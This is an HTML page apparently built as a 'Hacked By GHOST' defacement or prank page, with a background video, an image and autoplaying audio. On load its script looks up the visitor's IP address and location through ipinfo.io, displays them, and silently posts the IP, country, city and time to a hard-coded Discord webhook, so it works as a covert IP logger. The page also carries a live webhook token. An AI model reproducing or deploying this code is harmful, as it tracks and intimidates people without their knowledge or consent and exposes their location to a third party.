<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      margin: 0;
      padding: 0;
      background: black;
      font-family: 'Courier New', Courier, monospace;
      color: #9f8663;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      text-align: center;
      overflow: hidden;
    }

    #content {
      display: none;
      opacity: 0;
      transition: opacity 2s ease;
    }

    .image-container img {
      width: 400px;
      height: 400px;
      object-fit: cover;
      border: 2px solid #c2c2c2;
      border-radius: 20px;
      box-shadow: 0 0 15px rgba(255, 255, 0, 0.7);
    }

    .info {
      margin-top: 20px;
      font-size: 1.5em;
      color: #ffffff;
      text-shadow: 0 0 8px #ffffff, 0 0 15px #ffffff, 0 0 25px #ffffff;
      letter-spacing: 4.5px;
      white-space: pre-wrap;
    }

    .video-container {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      z-index: -1;
    }

    .video-container video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      filter: blur(15px);
    }
  </style>
</head>
<body>
  <div class="video-container">
    <video autoplay loop muted>
      <source src="https://cdn.discordapp.com/attachments/1254930563404660836/1367217394233376820/utomp3.com_-_Dark_is_the_Night_Soviet_WW2_Song.mp4" type="video/mp4" />
      Your browser does not support the video tag.
    </video>
  </div>

  <div class="gif-container">
    <img src="" alt="" />
  </div>

  <div id="content">
    <div class="image-container">
      <img src="https://i.pinimg.com/originals/f8/f6/9d/f8f69d18544a3de3a0e96c9da3c9f70d.jpg" alt="Thomas Shelby 4K" />
    </div>

    <audio autoplay loop>
      <source src="https://cdn.discordapp.com/attachments/1254930563404660836/1367217394233376820/utomp3.com_-_Dark_is_the_Night_Soviet_WW2_Song.mp4" type="audio/mp4" />
      Your browser does not support the audio element.
    </audio>

    <div class="info" id="ip-info"></div>
  </div>

  <script>
    setTimeout(() => {
      document.querySelector('.gif-container').style.display = 'none';
      const content = document.getElementById('content');
      content.style.display = 'block';
      setTimeout(() => {
        content.style.opacity = 1;
      }, 150);
    }, 200);

    fetch('https://ipinfo.io/json')
      .then((response) => response.json())
      .then((data) => {
        const { ip, country, city, region, loc, org, timezone } = data;
        const infoDiv = document.getElementById('ip-info');
        infoDiv.innerHTML = `<< Hacked By GHOST in >>\n<strong>IP:</strong> <span>${ip}</span><br><strong>City:</strong> <span>${city}</span><br><strong>Region:</strong> <span>${region}</span><br><strong>Country:</strong> <span>${country}</span><br><strong>Location:</strong> <span>${loc}</span><br><strong>Org:</strong> <span>${org}</span><br><strong>Timezone:</strong> <span>${timezone}</span>`;

        const dateTime = new Date().toLocaleString();
        const webhookUrl = 'https://discord.com/api/webhooks/1366907403714560031/KXqDaF7GaYYUhtTqpDePBHDBkv1kCtanoE-LGMuCIjPjVznT5wFFW-pQjPHcbZlGrmOD';

        fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`,
          }),
        });
      });

    setInterval(function () {}, 3500);
  </script>
</body>
</html>
